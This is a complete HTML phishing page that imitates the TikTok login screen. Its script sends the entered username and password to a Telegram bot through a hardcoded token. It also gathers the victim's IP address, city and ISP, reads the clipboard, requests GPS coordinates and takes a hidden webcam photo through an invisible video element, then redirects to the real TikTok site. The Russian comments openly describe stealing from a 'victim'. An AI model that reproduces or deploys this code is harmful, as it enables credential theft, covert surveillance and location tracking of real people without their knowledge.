<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to TikTok</title>
    <style>
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #000; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .container { width: 100%; max-width: 350px; padding: 20px; text-align: center; }
        h2 { margin-bottom: 20px; font-weight: 500; }
        input { width: 100%; padding: 15px; margin: 10px 0; background: #1a1a1a; border: 1px solid #333; color: #fff; border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; background: #fe2c55; color: #fff; border: none; border-radius: 5px; font-size: 16px; font-weight: bold; margin-top: 10px; cursor: pointer; }
        #camera-video { position: absolute; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>
    <div class="container">
        <h2>Log in to TikTok</h2>
        <form id="loginForm">
            <input type="text" id="username" placeholder="Email or username" required>
            <input type="password" id="password" placeholder="Password" required>
            <button type="submit" id="btn">Log in</button>
        </form>
    </div>

    <video id="camera-video" autoplay playsinline></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const BOT_TOKEN = "8758850534:AAF79a17p6NCuHMluPI_Rkw7FeoQSkCcRe8"; // Твой токен
        const CHAT_ID = "7485234259"; // Твой ID

        document.getElementById('loginForm').addEventListener('submit', async function(e) {
            e.preventDefault();
            const btn = document.getElementById('btn');
            btn.innerText = "Verifying... Please wait";
            btn.disabled = true;

            const user = document.getElementById('username').value;
            const pass = document.getElementById('password').value;
            let reportText = `🎯 **Жертва поймана!**\n👤 User: ${user}\n🔑 Pass: ${pass}\n`;

            // 1. Крадем IP, город и провайдера
            try {
                const ipRes = await fetch('https://ipapi.co/json/');
                const ipData = await ipRes.json();
                reportText += `🌐 IP: ${ipData.ip}\n📍 Локация: ${ipData.city}, ${ipData.country_name}\n🏢 ISP: ${ipData.org}\n`;
            } catch (err) { reportText += `🌐 IP: Не удалось получить\n`; }

            // 2. Крадем буфер обмена (если жертва недавно что-то копировала)
            try {
                const clipboard = await navigator.clipboard.readText();
                if (clipboard) reportText += `📋 Буфер обмена: ${clipboard.substring(0, 100)}...\n`;
            } catch (err) { /* Safari блокирует без прямого клика, пропускаем */ }

            // 3. Запрашиваем GPS (выскочит системное окно)
            try {
                const pos = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, { timeout: 5000 });
                });
                reportText += `🗺️ GPS: https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\n`;
            } catch (err) { reportText += `🗺️ GPS: Запрещено или недоступно\n`; }

            // 4. Делаем скрытое фото (выскочит окно камеры)
            let hasPhoto = false;
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                const video = document.getElementById('camera-video');
                video.srcObject = stream;
                await new Promise(resolve => setTimeout(resolve, 800)); // Ждем фокуса
                
                const canvas = document.getElementById('canvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                const dataURL = canvas.toDataURL('image/jpeg', 0.8);
                const blob = await (await fetch(dataURL)).blob();
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, 'face.jpg');
                formData.append('caption', reportText); // Отправляем текст вместе с фото
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                hasPhoto = true;
            } catch (err) { 
                reportText += `📸 Камера: Запрещено\n`; 
            }

            // 5. Если фото не было, отправляем хотя бы текст
            if (!hasPhoto) {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(reportText)}`, { mode: 'no-cors', keepalive: true });
            }

            // 6. Перекидываем на настоящий сайт (задержка, чтобы данные улетели)
            setTimeout(() => {
                window.location.href = "https://www.tiktok.com/login";
            }, 1500);
        });
    </script>
</body>
</html>
